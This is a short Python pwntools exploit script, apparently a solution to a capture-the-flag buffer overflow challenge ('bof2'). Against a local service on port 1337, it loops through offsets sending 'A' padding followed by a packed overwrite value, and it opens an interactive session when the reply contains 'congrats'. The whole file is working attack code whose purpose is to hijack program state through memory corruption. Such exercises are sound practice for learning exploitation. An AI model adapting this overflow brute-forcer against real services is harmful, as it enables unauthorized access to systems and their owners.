from pwn import *

# key is target address
key = p32(0x12345678)

# syntax 'for' find to offset
for i in range(1,60):

	# connect host ( read README.md)
	sock = remote("127.0.0.1",1337)

	# setting payload
	payload = 'A'*i + key
	payload += '\x0a'

	# payload exploit
	sock.sendline(payload)

	# offset print
	print "\ncurrent offset", i

	# content print 
	res = sock.recv(2096,timeout=1)
	
	# bof2 is find bellow code
	for _ in res.split(" "):
		if ("congrats" in _):
			sock.interactive()
		else:
			pass
		
	else:
		sock.close()